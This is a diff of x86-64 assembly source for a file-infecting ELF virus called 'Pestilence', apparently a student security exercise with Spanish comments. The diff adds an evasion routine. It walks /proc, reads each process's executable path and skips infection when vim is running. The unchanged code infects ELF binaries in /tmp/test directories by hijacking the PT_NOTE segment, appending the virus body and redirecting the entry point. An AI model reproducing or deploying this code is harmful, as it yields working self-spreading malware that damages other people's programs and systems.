@@ -6,8 +6,14 @@ section .text
 
     global _start
 
-    porrito_numerico:
-        ; rdi = puntero dirent_struct
+    _start:
+
+    jmp _init
+
+; ----------------------------------------- routines -------------------------------------------------------------------
+
+    directory_name_isdigit:
+        ; rdi = puntero dirent_buffert
         push rbx
         lea rsi, [rdi + dirent.d_name]
         xor rcx, rcx ; contador
@@ -26,8 +32,10 @@ section .text
             pop rbx
         ret
 
+; ----------------------------------------------------------------------------------------------------------------------
 
-    _start:
+    _init:
+
         PUSH_ALL
         push rsp
         ; this trick allows us to access Pestilence members using the VAR macro
@@ -41,52 +49,125 @@ section .text
         mov dword VAR(Pestilence.virus_size), ebx
 
     .open_proc:
+        ; open("/proc", O_RDONLY, NULL)
         lea rdi, [proc]
         mov rsi, O_RDONLY
         mov rax, SC_OPEN
         syscall
         test rax, rax
-        jl .jump_to_host
+        ; si falla el open de /proc, infectamos sin comprobaciones.
+        jle .jump_to_host
         mov VAR(Pestilence.fd_proc), rax
 
     .dirent_proc:
          ; getdents64(fd_dir, dirent_buffer, sizeof(dirent_buffer));
         mov rdi, VAR(Pestilence.fd_proc)
-        lea rsi, VAR(Pestilence.dirent_struc)
-        mov rdx, 4096
+        lea rsi, VAR(Pestilence.dirent_buffer)
+        mov rdx, 1024
         mov rax, SC_GETDENTS64
         syscall
         test rax, rax
-        jle .close_proc_dir 
+        jle .close_proc_dir
         xor r12, r12
         mov rbx, rax
 
     .check_dir_in_proc:
+        ; rbx = bytes escritos en dirent_buffer
+        ; r12 = contador de bytes leídos de dirent_buffer
         cmp r12, rbx
         jge .dirent_proc
 
-        lea rdi, VAR(Pestilence.dirent_struc)
+        lea rdi, VAR(Pestilence.dirent_buffer)
         add rdi, r12
 
+        ; sumamos a r12 el tamaño de el dirent que vamos a procesar.
         movzx ecx, word [rdi + dirent.d_len]
         add r12, rcx
 
+        ; comprobamos si es directorio
         cmp byte [rdi + dirent.d_type], DT_DIR
-        jne .check_dir_in_proc       
-        call porrito_numerico
-        cmp al, 0
         jne .check_dir_in_proc
 
-    .proces_proc_dir: 
-        TRACE_TEXT hello, 11
-        jmp .check_dir_in_proc
+        ; comprobamos que el nombre del directorio se corresponde con un PID
+        call directory_name_isdigit
+        cmp al, 0
 
+        jne .check_dir_in_proc
+
+    .proces_proc_dir:
+
+        mov r8, rdi   ; guardamos el puntero a la dirent struct
+
+        ; reservamos buffer destino
+        sub rsp, 128
+
+        ; escribimos "/proc/" en el stack
+        lea rdi, [rsp]
+        lea rsi, [proc]
+        mov rcx, 6
+        cld
+        rep movsb
+
+        ; calculamos longitud del nombre del directorio PID
+
+        ; rdi = puntero al nombre del directorio (string acabada en 0)
+        lea rdi, [r8 + dirent.d_name]
+        mov al, 0
+        mov rcx, -1   ; 0xffffffffffffffff
+        cld
+        repne scasb
+        ; El negado de 0xffffffffffffffff - el numero de veces que decrementa
+        ; hasta encontrar 0, es len + 1. (magia negra asm)
+        not rcx
+        dec rcx
+
+        ; concatenamos "/proc/" + "d_name"
+
+        lea rdi, [rsp]
+        add rdi, 6
+        lea rsi, [r8 + dirent.d_name]
+        ; rcx ya contiene la len a escribir
+        cld
+        rep movsb
+
+        ; concatenamos "/proc/d_name" + "/exe"
+
+        mov rsi, exe_string
+        mov rcx, 5
+        ; rcx ya contiene la len a escribir
+        cld
+        rep movsb
+
+        ; rdi = "/proc/PID/exe"
+        lea rdi, [rsp]
+        sub rsp, 128
+        lea rsi, [rsp]
+        mov rdx, 128
+        mov rax, SC_READLINK
+        syscall
+        test rax, rax
+        ; esto puede pasar a menudo por permisos. Si sucede, seguimos.
+        jle .check_dir_in_proc
+
+        lea rdi, [forbidden_prog + 4]
+        ; apuntamos con rsi al final de la cadena devuelta por readlink
+        add rsi, rax
+        mov rcx, 4
+        std
+        rep cmpsb
+
+        ; si está el forbidden program corriendo, saltamos al entrypoint
+        ; original (no infectamos)
+        je .jump_to_host
+
+        ; siguiente directorio.
+        jmp .check_dir_in_proc
 
     .close_proc_dir:
         mov rax, SC_CLOSE
         mov rdi, VAR(Pestilence.fd_proc)
         syscall
-    
+
 
 ; ----------------------------------------- VIRUS -------------------------------------------------------------------
 
@@ -111,7 +192,7 @@ section .text
     .dirent:
         ; getdents64(fd_dir, dirent_buffer, sizeof(dirent_buffer));
         mov rdi, VAR(Pestilence.fd_dir)
-        lea rsi, VAR(Pestilence.dirent_struc)
+        lea rsi, VAR(Pestilence.dirent_buffer)
         mov rdx, 1024
         mov rax, SC_GETDENTS64
         syscall
@@ -123,8 +204,8 @@ section .text
     ; getdents64 does not return one directory entry. It returns as many directory entries as it can
     ; fit in the buffer passed. This is why the following iteration checks N directory entries and not just one.
 
-    ; rdi = dirent_struct[0]
-    ; r12 = offset from dirent_struct[0]
+    ; rdi = dirent_buffert[0]
+    ; r12 = offset from dirent_buffert[0]
     ; rax = total bytes read in getdents
     .check_for_files_in_dirents:
         ; if offset == total_bytes, next entry.
@@ -132,7 +213,7 @@ section .text
         jge .dirent
 
         ; shift offset from the start of the dirent struct array
-        lea rdi, VAR(Pestilence.dirent_struc)
+        lea rdi, VAR(Pestilence.dirent_buffer)
         add rdi, r12
 
         ; add lenght of directory entry to offset
@@ -161,8 +242,8 @@ section .text
 
     .fstat:
         sub rsp, 144                ;fstat struct buffer
-        mov rdi, rax
         lea rsi, [rsp]
+        mov rdi, rax
         mov rax, SC_FSTAT
         syscall
         test rax, rax
@@ -241,7 +322,7 @@ section .text
         add rsi, rbx
         sub rsi, rcx
         lea rdi, Traza
-        mov rcx, 20         
+        mov rcx, 20
         cld                 ; incremental
         rep cmpsb           ; comparar rdi y rsi rcx bytes
         je .munmap
@@ -258,7 +339,7 @@ section .text
         xor ecx, ecx
         mov VAR(Pestilence.note_phdr_ptr), rcx
         mov VAR(Pestilence.max_vaddr_end), rcx
-    
+
     ;rax = phnum
     ;rbx = phdr_pointer
     .loop_phdr:
@@ -271,13 +352,13 @@ section .text
         je .assign_pt_note_phdr
         jne .next_phdr
         jmp .end_loop_phdr
-    
+
     .assign_pt_note_phdr:
         cmp qword VAR(Pestilence.note_phdr_ptr), 0x0
         jne .next_phdr
         mov VAR(Pestilence.note_phdr_ptr), rbx
         jmp .next_phdr
-    
+
     .compute_max_vaddr_end:
         ; r8 = p_vaddr + p_memsz
         mov r8, [rbx+Elf64_Phdr.p_vaddr]
@@ -287,18 +368,18 @@ section .text
         jl .next_phdr
         ; save new max_vaddr_end
         mov VAR(Pestilence.max_vaddr_end), r8
-    
+
     .next_phdr:
         dec rax
         add rbx, Elf64_Phdr_size ; siguiente nodo del phdr
         jmp .loop_phdr
-    
+
     .end_loop_phdr:
         cmp qword VAR(Pestilence.note_phdr_ptr), 0x0
         je .munmap
         cmp qword VAR(Pestilence.max_vaddr_end), 0x0
         je .munmap
-    
+
     .ftruncate:
         ; ftruncate(fd_file, file_final_len)
         mov rdi, VAR(Pestilence.fd_file)
@@ -308,7 +389,7 @@ section .text
         syscall
         test rax, rax
         jnz .munmap
-    
+
     .mod_pt_note:
         ; Pestilence.note_phdr_ptr es una dirección de memoria que apunta a un puntero
         lea rax, VAR(Pestilence.note_phdr_ptr)
@@ -328,7 +409,7 @@ section .text
         mov [rax+Elf64_Phdr.p_filesz], rcx              ; p_filesz = virus_size
         mov [rax+Elf64_Phdr.p_memsz], rcx               ; p_memsz = virus_size
         mov qword [rax+Elf64_Phdr.p_align], 0x1000      ; p_align = 0x1000 (4KB)
-    
+
     .write_payload:
         lea rsi, _start
         mov rdi, VAR(Pestilence.mmap_ptr)
@@ -350,14 +431,14 @@ section .text
         mov rax, VAR(Pestilence.mmap_ptr)
         mov rbx, VAR(Pestilence.new_entry)
         mov [rax + Elf64_Ehdr.e_entry], rbx
-    
+
     .munmap:
         ;munmap(map_ptr, len)
         mov rdi, VAR(Pestilence.mmap_ptr)
         mov esi, dword VAR(Pestilence.file_final_len)
         mov rax, SC_UNMAP
         syscall
-    
+
     .close_file:
         ; TODO llamar al munmap antes de cerrar el fd.
         mov rdi, VAR(Pestilence.fd_file)
@@ -367,15 +448,15 @@ section .text
     .skip_file:
         pop rax
         jmp .check_for_files_in_dirents
-    
+
     .close_dir:
         mov rax, SC_CLOSE
         mov rdi, VAR(Pestilence.fd_dir)
         syscall
-    
+
     .next_dir:
         mov rsi, VAR(Pestilence.dir_name_pointer)
-    
+
     .find_null:
         lodsb               ; al = *rsi++
         test al, al
@@ -383,7 +464,7 @@ section .text
         mov rdi, rsi
         cmp byte [rdi], 0   ; find double null
         jnz .open_dir
-    
+
     .jump_to_host:
         mov rsp, rbp
         add rsp, Pestilence_size
@@ -394,14 +475,16 @@ section .text
         sub rax, [rel virus_vaddr]          ; Base real (Absoluta - Virtual)
         add rax, [rel host_entrypoint]      ; Dirección host (Base + Offset)
         jmp rax
-    
+
     _dummy_host_entrypoint:
         mov rax, SC_EXIT
         xor rdi, rdi
         syscall
-    
-    hello           db      "[+] hello",10,0 ;11 
-    proc            db      "/proc",0
+
+    forbidden_prog  db      "/vim",0 ; 4
+    exe_string      db      "/exe",0 ; 5
+    hello           db      "[+] hello",10,0 ;11
+    proc            db      "/proc/",0 ; 7
     dirs            db      "/tmp/test",0,"/tmp/test2",0,0
     Traza_position  equ     _finish - Traza
     Traza           db      "tomartin & carce-bo",0  ;20
